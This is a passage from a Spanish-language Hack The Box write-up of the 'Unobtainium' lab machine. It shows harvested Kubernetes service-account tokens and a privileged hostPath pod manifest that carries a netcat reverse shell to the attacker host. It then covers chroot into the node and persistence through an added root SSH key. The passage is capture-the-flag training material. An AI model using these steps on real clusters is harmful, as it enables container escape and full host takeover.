eyJhbGciOiJSUzI1NiIsImtpZCI6IkpOdm9iX1ZETEJ2QlZFaVpCeHB6TjBvaWNEalltaE1ULXdCNWYtb2JWUzgifQ.eyJpc3MiOiJrdWJlcm5ldGVzL3NlcnZpY2VhY2NvdW50Iiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9uYW1lc3BhY2UiOiJrdWJlLXN5c3RlbSIsImt1YmVybmV0ZXMuaW8vc2VydmljZWFjY291bnQvc2VjcmV0Lm5hbWUiOiJwZXJzaXN0ZW50LXZvbHVtZS1iaW5kZXItdG9rZW4tZmQyOTIiLCJrdWJlcm5ldGVzLmlvL3NlcnZpY2VhY2NvdW50L3NlcnZpY2UtYWNjb3VudC5uYW1lIjoicGVyc2lzdGVudC12b2x1bWUtYmluZGVyIiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9zZXJ2aWNlLWFjY291bnQudWlkIjoiZTBmNGRkMjAtNTA2ZS00NWY2LTg5Y2MtMDY4MTVlNzY5ZTk0Iiwic3ViIjoic3lzdGVtOnNlcnZpY2VhY2NvdW50Omt1YmUtc3lzdGVtOnBlcnNpc3RlbnQtdm9sdW1lLWJpbmRlciJ9.QrwIUdAKVoBZcoCGn5DTDYw9EyhdA9WU2Uj5snWJo-J59iPljVBhdhdnoDEAwWXzCE76PN_EBUIF87KnAc0PUk8h5xEgykNErplvZ-7mpZI6s-wq180BTf6A4Ej-x-27Vo4pEKsFUbDLd_eY9vAIlXFoMFTheDjDgl-IXq4g0-QMDPxiGut5Z4DBc-RPmvt3csc-Wrs-ZjAhpL6PoscRqNEgsoeV5bpYbtp3kvAJ5hKdDeboj3-1H-iQL3RbDhMAyqsT-lINoDaHAImo5umWZlHeDQBDeZgNxMwqLkbBgQVCTNgcAQlt218yLi9LQLIWMOUTyyfLp0i3_TepH3rwLA persistentvolumes [] [] [create delete get list update watch] pods [] [] [create delete get list watch] endpoints [] [] [create delete get update] services [] [] [create delete get] events.events.k8s.io [] [] [create patch update] selfsubjectaccessreviews.authorization.k8s.io [] [] [create] selfsubjectrulesreviews.authorization.k8s.io [] [] [create] persistentvolumeclaims [] [] [get list update watch] persistentvolumeclaims/status [] [] [update] persistentvolumes/status [] [] [update] events [] [] [watch create patch update] eyJhbGciOiJSUzI1NiIsImtpZCI6IkpOdm9iX1ZETEJ2QlZFaVpCeHB6TjBvaWNEalltaE1ULXdCNWYtb2JWUzgifQ.eyJpc3MiOiJrdWJlcm5ldGVzL3NlcnZpY2VhY2NvdW50Iiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9uYW1lc3BhY2UiOiJrdWJlLXN5c3RlbSIsImt1YmVybmV0ZXMuaW8vc2VydmljZWFjY291bnQvc2VjcmV0Lm5hbWUiOiJyZXBsaWNhc2V0LWNvbnRyb2xsZXItdG9rZW4tYnpidDgiLCJrdWJlcm5ldGVzLmlvL3NlcnZpY2VhY2NvdW50L3NlcnZpY2UtYWNjb3VudC5uYW1lIjoicmVwbGljYXNldC1jb250cm9sbGVyIiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9zZXJ2aWNlLWFjY291bnQudWlkIjoiODEwNWE2NGUtZTgzOS00YmU5LWFkMDctNWE2NjhhNmUyZjFiIiwic3ViIjoic3lzdGVtOnNlcnZpY2VhY2NvdW50Omt1YmUtc3lzdGVtOnJlcGxpY2FzZXQtY29udHJvbGxlciJ9.v7Xi-BTZIPjlPZBYIE_rEyrqWvb8criBypNBVR25ANKSJdgG6LIq5uBwnX7WKoMc0jb2mB_70wpMAtsOl0XRU576wuxLf6lQK5YLh-VzoOA6mltZqR2l1DKCunrAwwcPMSttiY-0gyGlxjDiXxBevRlMd0qWYr9EubS62IRFqXg0KyEzUl9xQU7Lysctl3JsYB7MNefwAtTUENIWhkzKgeOf_dx-jGLBrCE5icUXrFcRBYMH5jUwWb__wN42jgxOGGKzXnG2aPkvmmAIevZP_Fmdlw9HuCa1t2-dZ_94JoNRy_43tgKkprKqy6XU_QDPdfN7N1T1igh4ThmH3v3KDg pods [] [] [create delete list patch watch] events [] [] [create patch update] events.events.k8s.io [] [] [create patch update] selfsubjectaccessreviews.authorization.k8s.io [] [] [create] selfsubjectrulesreviews.authorization.k8s.io [] [] [create] replicasets.apps [] [] [get list update watch] replicasets.extensions [] [] [get list update watch] replicasets.apps/finalizers [] [] [update] replicasets.apps/status [] [] [update] replicasets.extensions/finalizers [] [] [update] replicasets.extensions/status [] [] [update] eyJhbGciOiJSUzI1NiIsImtpZCI6IkpOdm9iX1ZETEJ2QlZFaVpCeHB6TjBvaWNEalltaE1ULXdCNWYtb2JWUzgifQ.eyJpc3MiOiJrdWJlcm5ldGVzL3NlcnZpY2VhY2NvdW50Iiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9uYW1lc3BhY2UiOiJrdWJlLXN5c3RlbSIsImt1YmVybmV0ZXMuaW8vc2VydmljZWFjY291bnQvc2VjcmV0Lm5hbWUiOiJyZXBsaWNhdGlvbi1jb250cm9sbGVyLXRva2VuLWp6OGs4Iiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9zZXJ2aWNlLWFjY291bnQubmFtZSI6InJlcGxpY2F0aW9uLWNvbnRyb2xsZXIiLCJrdWJlcm5ldGVzLmlvL3NlcnZpY2VhY2NvdW50L3NlcnZpY2UtYWNjb3VudC51aWQiOiJhNzg1YWY5MS1hMmZmLTQxZmEtYWQ3Zi02ODhjMGVlNDJiMWIiLCJzdWIiOiJzeXN0ZW06c2VydmljZWFjY291bnQ6a3ViZS1zeXN0ZW06cmVwbGljYXRpb24tY29udHJvbGxlciJ9.lbUjkDsY_B8GhgvAIOXW6olyhNSzmJAJtDh0Jfc2RFMErenHEG9KuFnY-ufyhNSqf10_5Lb_fkz2-Sg3YIcxksghFzGIMote1GktWNAHCKslMqUfnv7x48lp1Nzhy7zvhNe-EVEdYRUpOXxdI5YdKPVVNBFUwStqfKuNThFB6lsyGFxynMUIK5Oqu2hvV4afhaja9WKZWxi2drUvHgDJYylbach1WMf_jWc7SIYhxpd8oYi84HUxpj2tlQHa1L4gy0XTFgvoeEY-NhllQ2vsimMQEvQRTeUVdoA0l1YVWkPb4SnIQR6cI3hmpxRlY3bxUIVr9-_fo6Zt3D2IFik0nA pods [] [] [create delete list patch watch] events [] [] [create patch update] events.events.k8s.io [] [] [create patch update] selfsubjectaccessreviews.authorization.k8s.io [] [] [create] selfsubjectrulesreviews.authorization.k8s.io [] [] [create] replicationcontrollers [] [] [get list update watch] replicationcontrollers/finalizers [] [] [update] replicationcontrollers/status [] [] [update] eyJhbGciOiJSUzI1NiIsImtpZCI6IkpOdm9iX1ZETEJ2QlZFaVpCeHB6TjBvaWNEalltaE1ULXdCNWYtb2JWUzgifQ.eyJpc3MiOiJrdWJlcm5ldGVzL3NlcnZpY2VhY2NvdW50Iiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9uYW1lc3BhY2UiOiJrdWJlLXN5c3RlbSIsImt1YmVybmV0ZXMuaW8vc2VydmljZWFjY291bnQvc2VjcmV0Lm5hbWUiOiJzdGF0ZWZ1bHNldC1jb250cm9sbGVyLXRva2VuLXoybnNkIiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9zZXJ2aWNlLWFjY291bnQubmFtZSI6InN0YXRlZnVsc2V0LWNvbnRyb2xsZXIiLCJrdWJlcm5ldGVzLmlvL3NlcnZpY2VhY2NvdW50L3NlcnZpY2UtYWNjb3VudC51aWQiOiI4Y2IxZGFjZC1jNTI2LTQ2MmQtYWNiNi04NDdmNzYxNTUyNGIiLCJzdWIiOiJzeXN0ZW06c2VydmljZWFjY291bnQ6a3ViZS1zeXN0ZW06c3RhdGVmdWxzZXQtY29udHJvbGxlciJ9.SejnrSrA4uMb3nIZ_vOplF8A1dEHgH4sTWkd6H3Nawaye-IvgdIYifaZvw8Chl_hS_SjuVdn17PI6cfgcg2B77zvJEFgqhfs4IXJg5SIoaEp-kB5oKYh7jt3SvVl0lZ78X77dKkECp54esYpVmwUQQjjS3pgCgwZKl3-V1SgPomWHiHAuxmh9r6VRLExhUFbCvhCW6XmOgTN7BJIOMwG_WUmsmqTcQSed3lM_IZCvaLy8ykDpNOTkJkFWDd7fXEhBADhuaizq0qk4YDAmsF-dRIBvhwATCt9L3iIb6oEoC9iirNOrXglSXgVXsW2sEcbJCPbHXAtIq--SYNWBE_PFw controllerrevisions.apps [] [] [create delete get list patch update watch] persistentvolumeclaims [] [] [create get] events [] [] [create patch update] events.events.k8s.io [] [] [create patch update] selfsubjectaccessreviews.authorization.k8s.io [] [] [create] selfsubjectrulesreviews.authorization.k8s.io [] [] [create] pods [] [] [list watch create delete get patch update] statefulsets.apps/finalizers [] [] [update] statefulsets.apps/status [] [] [update] root@webapp-deployment-5d764566f4-lrpt9:~/k_info# Utilizamos parte del token (que permite crear pods) para obtener el nombre del secret, y asi obtener su certificado (persistent-volume-binder-token-fd292).\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 root@webapp-deployment-5d764566f4-lrpt9:~/k_info# /root/kiub --token=$(cat /root/k_info/k6) --certificate-authority=/root/k_info/k6_cert --server=https://10.96.0.1:443 describe secrets -n kube-system | grep -e \u0026#34;Name\u0026#34; -e \u0026#34;Qlt218yLi9LQLIWMOUTyyfLp0i3_TepH3rwLA\u0026#34; [... REDACTED ...] Name: persistent-volume-binder-token-fd292 Namespace: kube-system token: eyJhbGciOiJSUzI1NiIsImtpZCI6IkpOdm9iX1ZETEJ2QlZFaVpCeHB6TjBvaWNEalltaE1ULXdCNWYtb2JWUzgifQ.eyJpc3MiOiJrdWJlcm5ldGVzL3NlcnZpY2VhY2NvdW50Iiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9uYW1lc3BhY2UiOiJrdWJlLXN5c3RlbSIsImt1YmVybmV0ZXMuaW8vc2VydmljZWFjY291bnQvc2VjcmV0Lm5hbWUiOiJwZXJzaXN0ZW50LXZvbHVtZS1iaW5kZXItdG9rZW4tZmQyOTIiLCJrdWJlcm5ldGVzLmlvL3NlcnZpY2VhY2NvdW50L3NlcnZpY2UtYWNjb3VudC5uYW1lIjoicGVyc2lzdGVudC12b2x1bWUtYmluZGVyIiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9zZXJ2aWNlLWFjY291bnQudWlkIjoiZTBmNGRkMjAtNTA2ZS00NWY2LTg5Y2MtMDY4MTVlNzY5ZTk0Iiwic3ViIjoic3lzdGVtOnNlcnZpY2VhY2NvdW50Omt1YmUtc3lzdGVtOnBlcnNpc3RlbnQtdm9sdW1lLWJpbmRlciJ9.QrwIUdAKVoBZcoCGn5DTDYw9EyhdA9WU2Uj5snWJo-J59iPljVBhdhdnoDEAwWXzCE76PN_EBUIF87KnAc0PUk8h5xEgykNErplvZ-7mpZI6s-wq180BTf6A4Ej-x-27Vo4pEKsFUbDLd_eY9vAIlXFoMFTheDjDgl-IXq4g0-QMDPxiGut5Z4DBc-RPmvt3csc-Wrs-ZjAhpL6PoscRqNEgsoeV5bpYbtp3kvAJ5hKdDeboj3-1H-iQL3RbDhMAyqsT-lINoDaHAImo5umWZlHeDQBDeZgNxMwqLkbBgQVCTNgcAQlt218yLi9LQLIWMOUTyyfLp0i3_TepH3rwLA [... REDACTED ...] root@webapp-deployment-5d764566f4-lrpt9:~/k_info# /root/kiub --token=$(cat /root/k_info/k6) --certificate-authority=/root/k_info/k6_cert --server=https://10.96.0.1:443 get secrets/persistent-volume-binder-token-fd292 -o yaml -n kube-system \u0026lt;nt-volume-binder-token-fd292 -o yaml -n kube-system apiVersion: v1 data: ca.crt: LS0tLS1CRUdJTiBDRVJUSUZJQ0FURS0tLS0tCk1JSUM1ekNDQWMrZ0F3SUJBZ0lCQVRBTkJna3Foa2lHOXcwQkFRc0ZBREFWTVJNd0VRWURWUVFERXdwdGFXNXAKYTNWaVpVTkJNQjRYRFRJeE1ERXdOekV6TWpRME9Wb1hEVE14TURFd05qRXpNalEwT1Zvd0ZURVRNQkVHQTFVRQpBeE1LYldsdWFXdDFZbVZEUVRDQ0FTSXdEUVlKS29aSWh2Y05BUUVCQlFBRGdnRVBBRENDQVFvQ2dnRUJBTVRDCmozSE9PMXRhaE1PUHpkNjhuYUtoQmVpYUFaM2lxdC9TY25lZ1RnbEttdHo1RGFnRUQ1WWFqWk0rVXl2UEVxUSsKdSttYjFaYzFLYnJjMkZnM0M0OEJZN09JUDZHZk9YOTkwUERLSmhxWnRhT0FkY1U1R2ExYXZTK2wzZG82VjJrQwplVnN0d1g2U1ZJYnpHSkVVeE1VUGlac0Z0Nkhzdk43aHRQMVA1Z2V3d3Rnc1ZJWER5TGwvZVJmd0NuMlpXK24zCk5nQzRPSTg0empWSHBYbVhGYUdzZURIYi9FNHdLL04waE1EMERFVlBKc0VPb2dITTlMbmRVZ3lKbWhBdFdiRWoKMjUrSDhBd1FpMy84UFlORXNtdFNBVUV1V3RZMzZweC9zRDVDdGhpTmxOcGtCNXQ1YzFHSzkwRG15b2ZxQmdZdgo5d2tDTkdHWktwM0F4TU1OMm5zQ0F3RUFBYU5DTUVBd0RnWURWUjBQQVFIL0JBUURBZ0trTUIwR0ExVWRKUVFXCk1CUUdDQ3NHQVFVRkJ3TUNCZ2dyQmdFRkJRY0RBVEFQQmdOVkhSTUJBZjhFQlRBREFRSC9NQTBHQ1NxR1NJYjMKRFFFQkN3VUFBNElCQVFBSEpqbzhVYzNTSDFVbnNLU3daSlR1eWozNlcvbXNiTXIwcFNuM2RsRTZCb3V1a2hGMwo5R3htVmEyYW40L1ZGSmtBc1pTcUZVejFlNTJxdkpvRkpjWGVjNE1pTjZHWlRXdVVBOUQvanFpYXBuSFdlTzh4ClJHazRXTjY2WnJhTTBYM1BxYUhvK2NiZmhLT2xMOWprVXh2RSszQld1ajlwbHlEM245dEZlM2xuYXNEZnp5NE0KcTQ2NWl4UFpxRnFWY2h4UUZRK3BaMjRLaXFvUVc0bWFtL3g1RlB5MTMrTXc4SjR6Yjh2TGR1dkxRUjN3cFVHYgp2S1hkbktPTFdzaUV4eXJqcFpqWmJZQkw4YjcwNVhGRkd2bWFicDIxYUc4cHNCMVh2c0xpR0ZRRXF5RGZlRlJXCmhsN0twVUlTbDQrTnA1c0FpWE53dGJTREUrMjJRVnRaYnVEbgotLS0tLUVORCBDRVJUSUZJQ0FURS0tLS0tCg== namespace: a3ViZS1zeXN0ZW0= token: ZXlKaGJHY2lPaUpTVXpJMU5pSXNJbXRwWkNJNklrcE9kbTlpWDFaRVRFSjJRbFpGYVZwQ2VIQjZUakJ2YVdORWFsbHRhRTFVTFhkQ05XWXRiMkpXVXpnaWZRLmV5SnBjM01pT2lKcmRXSmxjbTVsZEdWekwzTmxjblpwWTJWaFkyTnZkVzUwSWl3aWEzVmlaWEp1WlhSbGN5NXBieTl6WlhKMmFXTmxZV05qYjNWdWRDOXVZVzFsYzNCaFkyVWlPaUpyZFdKbExYTjVjM1JsYlNJc0ltdDFZbVZ5Ym1WMFpYTXVhVzh2YzJWeWRtbGpaV0ZqWTI5MWJuUXZjMlZqY21WMExtNWhiV1VpT2lKd1pYSnphWE4wWlc1MExYWnZiSFZ0WlMxaWFXNWtaWEl0ZEc5clpXNHRabVF5T1RJaUxDSnJkV0psY201bGRHVnpMbWx2TDNObGNuWnBZMlZoWTJOdmRXNTBMM05sY25acFkyVXRZV05qYjNWdWRDNXVZVzFsSWpvaWNHVnljMmx6ZEdWdWRDMTJiMngxYldVdFltbHVaR1Z5SWl3aWEzVmlaWEp1WlhSbGN5NXBieTl6WlhKMmFXTmxZV05qYjNWdWRDOXpaWEoyYVdObExXRmpZMjkxYm5RdWRXbGtJam9pWlRCbU5HUmtNakF0TlRBMlpTMDBOV1kyTFRnNVkyTXRNRFk0TVRWbE56WTVaVGswSWl3aWMzVmlJam9pYzNsemRHVnRPbk5sY25acFkyVmhZMk52ZFc1ME9tdDFZbVV0YzNsemRHVnRPbkJsY25OcGMzUmxiblF0ZG05c2RXMWxMV0pwYm1SbGNpSjkuUXJ3SVVkQUtWb0JaY29DR241RFREWXc5RXloZEE5V1UyVWo1c25XSm8tSjU5aVBsalZCaGRoZG5vREVBd1dYekNFNzZQTl9FQlVJRjg3S25BYzBQVWs4aDV4RWd5a05FcnBsdlotN21wWkk2cy13cTE4MEJUZjZBNEVqLXgtMjdWbzRwRUtzRlViRExkX2VZOXZBSWxYRm9NRlRoZURqRGdsLUlYcTRnMC1RTURQeGlHdXQ1WjREQmMtUlBtdnQzY3NjLVdycy1aakFocEw2UG9zY1JxTkVnc29lVjVicFlidHAza3ZBSjVoS2REZWJvajMtMUgtaVFMM1JiRGhNQXlxc1QtbElOb0RhSEFJbW81dW1XWmxIZURRQkRlWmdOeE13cUxrYkJnUVZDVE5nY0FRbHQyMTh5TGk5TFFMSVdNT1VUeXlmTHAwaTNfVGVwSDNyd0xB kind: Secret metadata: annotations: kubernetes.io/service-account.name: persistent-volume-binder kubernetes.io/service-account.uid: e0f4dd20-506e-45f6-89cc-06815e769e94 creationTimestamp: \u0026#34;2021-01-17T07:10:54Z\u0026#34; name: persistent-volume-binder-token-fd292 namespace: kube-system resourceVersion: \u0026#34;223\u0026#34; uid: a304e75b-489a-4e3c-8091-4f6984df4009 type: kubernetes.io/service-account-token Finalmente decodificamos y creamos los archivos de token y ca.cert, tambien creamos una variable para poder interactuar con estos archivos.\n1 2 3 4 5 6 7 root@webapp-deployment-5d764566f4-lrpt9:~/k_info/new# ls -lah total 16K drwxr-xr-x 2 root root 4.0K Jun 16 08:53 . drwxr-xr-x 3 root root 4.0K Jun 16 08:52 .. -rw-r--r-- 1 root root 1.1K Jun 16 08:52 ca.crt -rw-r--r-- 1 root root 978 Jun 16 08:53 token root@webapp-deployment-5d764566f4-lrpt9:~/k_info/new# export k=\u0026#34;/root/kiub --token=$(cat /root/k_info/new/token) --certificate-authority=/root/k_info/new/ca.crt --server=https://10.96.0.1:443\u0026#34; Escaping From The Pod Confirmamos que podemos crear y listar pods en kube-system, con ello podriamos crear un nuevo pod utilizando un archivo yaml que nos de acceso privilegiado.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 root@webapp-deployment-5d764566f4-lrpt9:~/k_info/new# $k auth can-i create pods -n kube-system \u0026lt;_info/new# $k auth can-i create pods -n kube-system yes root@webapp-deployment-5d764566f4-lrpt9:~/k_info/new# $k get pods -o wide -n kube-system $k get pods -o wide -n kube-system NAME READY STATUS RESTARTS AGE IP NODE NOMINATED NODE READINESS GATES backup-pod 0/1 CrashLoopBackOff 289 148d 172.17.0.4 unobtainium \u0026lt;none\u0026gt; \u0026lt;none\u0026gt; coredns-74ff55c5b-sclll 1/1 Running 31 150d 172.17.0.10 unobtainium \u0026lt;none\u0026gt; \u0026lt;none\u0026gt; etcd-unobtainium 1/1 Running 0 18h 10.10.10.235 unobtainium \u0026lt;none\u0026gt; \u0026lt;none\u0026gt; kube-apiserver-unobtainium 1/1 Running 0 18h 10.10.10.235 unobtainium \u0026lt;none\u0026gt; \u0026lt;none\u0026gt; kube-controller-manager-unobtainium 1/1 Running 34 150d 10.10.10.235 unobtainium \u0026lt;none\u0026gt; \u0026lt;none\u0026gt; kube-proxy-zqp45 1/1 Running 31 150d 10.10.10.235 unobtainium \u0026lt;none\u0026gt; \u0026lt;none\u0026gt; kube-scheduler-unobtainium 1/1 Running 31 150d 10.10.10.235 unobtainium \u0026lt;none\u0026gt; \u0026lt;none\u0026gt; storage-provisioner 1/1 Running 63 150d 10.10.10.235 unobtainium \u0026lt;none\u0026gt; \u0026lt;none\u0026gt; Siguiendo el post Kubernetes Namespace Breakout y Escaping from the pod, realizamos algunos pasos para obtener una shell. Inicialmente enumeramos las imagenes existentes mediante los pods, luego modificamos el archivo de ejemplo utilizando una de las imagenes, en este caso dev-alpine.\n1 2 3 4 5 6 7 8 9 10 root@webapp-deployment-5d764566f4-lrpt9:~/k_info/new# $k get pods -n kube-system -o=jsonpath=\u0026#39;{range .items[*]}{\u0026#34;\\n\u0026#34;}{.metadata.name}{\u0026#34;:\\t\u0026#34;}{range .spec.containers[*]}{.image}{\u0026#34;, \u0026#34;}{end}{end}\u0026#39; |sort backup-pod: localhost:5000/dev-alpine, coredns-74ff55c5b-sclll: k8s.gcr.io/coredns:1.7.0, etcd-unobtainium: k8s.gcr.io/etcd:3.4.13-0, kube-apiserver-unobtainium: k8s.gcr.io/kube-apiserver:v1.20.0, kube-controller-manager-unobtainium: k8s.gcr.io/kube-controller-manager:v1.20.0, kube-proxy-zqp45: k8s.gcr.io/kube-proxy:v1.20.0, kube-scheduler-unobtainium: k8s.gcr.io/kube-scheduler:v1.20.0, storage-provisioner: gcr.io/k8s-minikube/storage-provisioner:v4, root@webapp-deployment-5d764566f4-lrpt9:~/k_info/new# Ping Agregamos un pequeño ping hacia nuestra maquina como un pequeño test.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 apiVersion: v1 kind: Pod metadata: labels: run: podsito name: podsito spec: hostPID: true hostIPC: true hostNetwork: true volumes: - name: host-fs hostPath: path: / containers: - image: localhost:5000/dev-alpine name: podsito command: [\u0026#34;/bin/sh\u0026#34;, \u0026#34;-c\u0026#34;, \u0026#34;ping -c 1 10.10.14.10\u0026#34;] securityContext: privileged: true allowPrivilegeEscalation: true volumeMounts: - name: host-fs mountPath: /host restartPolicy: Never Creamos el pod (podsito), luego vemos que localmente obtuvimos ping desde la maquina.\n1 2 3 4 5 6 7 8 9 10 11 12 13 # POD root@webapp-deployment-5d764566f4-lrpt9:~/k_info/new# $k apply -f podsito.yaml --namespace=kube-system $k apply -f edit.yaml --namespace=kube-system \u0026lt;/new# $k apply -f edit.yaml --namespace=kube-system pod/podsito created root@webapp-deployment-5d764566f4-lrpt9:~/k_info/new# # LOCAL π ~/htb/unobtainium/www ❯ sudo tcpdump -i tun0 icmp tcpdump: verbose output suppressed, use -v[v]... for full protocol decode listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes 06:40:12.930534 IP unobtainium.htb \u0026gt; 10.10.14.10: ICMP echo request, id 5387, seq 0, length 64 06:40:12.930572 IP 10.10.14.10 \u0026gt; unobtainium.htb: ICMP echo reply, id 5387, seq 0, length 64 Shell - Root Modificamos nuevamente el archivo agregando una shell inversa dentro de command.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 apiVersion: v1 kind: Pod metadata: labels: run: podsito name: podsito spec: hostPID: true hostIPC: true hostNetwork: true volumes: - name: host-fs hostPath: path: / containers: - image: localhost:5000/dev-alpine name: podsito command: [\u0026#34;/bin/sh\u0026#34;, \u0026#34;-c\u0026#34;, \u0026#34;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2\u0026gt;\u0026amp;1|nc 10.10.14.10 1330 \u0026gt;/tmp/f\u0026#34;] securityContext: privileged: true allowPrivilegeEscalation: true volumeMounts: - name: host-fs mountPath: /host restartPolicy: Never Tras la creacion del pod obtuvimos una shell como root y, vemos la direccion /host que es donde se encuentra la direccion raiz del nodo, se ejecuta chroot para hacerlo accesible a nosotros.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 π ~ ❯ rlwrap nc -lvp 1330 listening on [any] 1330 ... connect to [10.10.14.10] from unobtainium.htb [10.10.10.235] 44533 /bin/sh: can\u0026#39;t access tty; job control turned off / # whoami root / # ls -lah total 68K drwxr-xr-x 1 root root 4.0K Jun 16 11:07 . drwxr-xr-x 1 root root 4.0K Jun 16 11:07 .. -rwxr-xr-x 1 root root 0 Jun 16 11:07 .dockerenv drwxr-xr-x 2 root root 4.0K Feb 21 22:43 bin drwxr-xr-x 13 root root 3.7K Jun 16 11:07 dev drwxr-xr-x 1 root root 4.0K Jun 16 11:07 etc drwxr-xr-x 2 root root 4.0K Feb 21 22:43 home drwxr-xr-x 19 root root 4.0K Feb 22 00:04 host drwxr-xr-x 7 root root 4.0K Feb 21 22:43 lib drwxr-xr-x 5 root root 4.0K Feb 21 22:43 media drwxr-xr-x 2 root root 4.0K Feb 21 22:43 mnt drwxr-xr-x 2 root root 4.0K Feb 21 22:43 opt dr-xr-xr-x 424 root root 0 Jun 15 14:12 proc drwx------ 2 root root 4.0K Feb 21 22:43 root drwxr-xr-x 1 root root 4.0K Jun 16 11:07 run drwxr-xr-x 2 root root 4.0K Feb 21 22:43 sbin drwxr-xr-x 2 root root 4.0K Feb 21 22:43 srv dr-xr-xr-x 13 root root 0 Jun 15 14:13 sys drwxrwxrwt 1 root root 4.0K Jun 16 11:07 tmp drwxr-xr-x 7 root root 4.0K Feb 21 22:43 usr drwxr-xr-x 12 root root 4.0K Feb 21 22:43 var / # chroot /host/ bash Actualizamos nuestra shell con python y realizamos la lectura de la flag root.txt.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 which python which python3 /usr/bin/python3 python3 -c \u0026#39;import pty; pty.spawn(\u0026#34;/bin/bash\u0026#34;);\u0026#39; groups: cannot find name for group ID 11 To run a command as administrator (user \u0026#34;root\u0026#34;), use \u0026#34;sudo \u0026lt;command\u0026gt;\u0026#34;. See \u0026#34;man sudo_root\u0026#34; for details. root@unobtainium:/# cd root@unobtainium:~# ls -lah total 40K drwx------ 6 root root 4.0K Mar 24 10:36 . drwxr-xr-x 19 root root 4.0K Feb 22 00:04 .. lrwxrwxrwx 1 root root 9 Jan 18 03:44 .bash_history -\u0026gt; /dev/null -rw-r--r-- 1 root root 3.1K Dec 5 2019 .bashrc drwx------ 2 root root 4.0K Feb 22 00:08 .cache drwxr-x--- 3 root root 4.0K Jan 8 13:26 .kube drwxr-xr-x 3 root root 4.0K Jan 18 05:11 .local drwxr-xr-x 10 root root 4.0K Jan 17 06:23 .minikube -rw-r--r-- 1 root root 161 Dec 5 2019 .profile -rwxr-xr-x 1 root root 3.3K Feb 15 18:34 pod_cleanup.py -rw-r--r-- 1 root root 33 Jun 15 15:14 root.txt root@unobtainium:~# cat root.txt 8a812ffde94e627a507cfb24937dade1 root@unobtainium:~# Estable Shell - SSH El pod (podsito) no podia ser accedido atravez de bash utilizando kubectl ya que mostraba un error o simplemente no dejaba.\n1 2 3 4 root@webapp-deployment-5d764566f4-lrpt9:~/k_info/new# $k exec -it podsito -n kube-system -- bash \u0026lt;nfo/new# $k exec -it podsito -n kube-system -- bash error: cannot exec into a container in a completed pod; current phase is Failed root@webapp-deployment-5d764566f4-lrpt9:~/k_info/new# La shell que obtuvimos moría en cierto tiempo por lo que creamos el archivo authorized_keys en /root/.ssh/ y agregamos nuestra clave publica, tambien agregamos al archivo /etc/ssh/ssh-config la opcion de permitir al usuario root ingresar por le servicio SSH.\n1 2 3 4 5 chroot /host/ bash python3 -c \u0026#39;import pty; pty.spawn(\u0026#34;/bin/bash\u0026#34;);\u0026#39; root@unobtainium:/# echo \u0026#34;PermitRootLogin yes\u0026#34; \u0026gt;\u0026gt; /etc/ssh/ssh-config \u0026amp;\u0026amp; service sshd restart root@unobtainium:/# mkdir /root/.ssh root@unobtainium:/# echo \u0026#34;ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCyDKIwM8Tc5baeLnWchM6wLnLcyFuZDEf5x6iboAW75NquPu0/cB7UXw+5OBH36P9AuLKUjxxPPXn4rQa7pd7YBPGtXNkQoJci6M6Z/msdlXN8JXCco3jV+DL5+RmJX51Fh8ZRogzA/CaClRvKX8b0pyROiAarsKC8rmFZzhl39hSgFXXdR7NwBY8knPGuhY3HoECX7VCj+l34qLjajyO1hKMTAn9yqpUFJ9P7NLjI0qVpW9xBCAkVPjhPtl3O8ed1yd51mj8iJYMN34qR3U2S1tTDWT3s5dBNnbUHLfweFigAn4XqDTcFwbP62ydH1y/j1hGW88+gYb5LCyLdifogRdKV3dn1+hGgXgD1pNWv2HJ/1IJhWij2q7j/cvJO5zN7LnGPwmzAyDOUSvLcpf94b10z+X9Hyz6v4CxDmfKvTrakI7WoYiBGXwbC+zlb9RNbg+oHGSEapPtL56UCdJKfC/TvFbs/q+Nuq41ULJNERZ19qIyxCshQtisKwFY2If8= kali@kali\u0026#34; \u0026gt; /root/.ssh/authorized_keys Con ello logramos obtener una shell más comoda.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 π ~/htb/unobtainium/www ❯ ssh root@unobtainium.htb Welcome to Ubuntu 20.04.2 LTS (GNU/Linux 5.4.0-70-generic x86_64) * Documentation: https://help.ubuntu.com * Management: https://landscape.canonical.com * Support: https://ubuntu.com/advantage System information as of Wed 16 Jun 2021 12:25:35 PM BST System load: 0.25 Usage of /: 63.3% of 13.22GB Memory usage: 28% Swap usage: 0% Processes: 411 Users logged in: 0 IPv4 address for docker0: 172.17.0.1 IPv4 address for ens192: 10.10.10.235 IPv6 address for ens192: dead:beef::250:56ff:feb9:5dcc =\u0026gt; There are 113 zombie processes. 0 updates can be installed immediately. 0 of these updates are security updates. The list of available updates is more than a week old. To check for new updates run: sudo apt update Last login: Mon Feb 22 00:08:29 2021 root@unobtainium:~# ","description":"En Unobtainium, encontramos una aplicacion en Electron, el codigo fuente nos guio a multiples vulnerabilidades para explotar y obtener acceso. Tras una enumeracion notamos que es un entorno relacionado a Kubernetes, explotamos con un script las aplicaciones para acceder a informacion de acceso, con ello logramos escapar del contenedor y obtener acceso al host.","id":51,"section":"posts","tags":["deb","asar","electron","npm","prototype 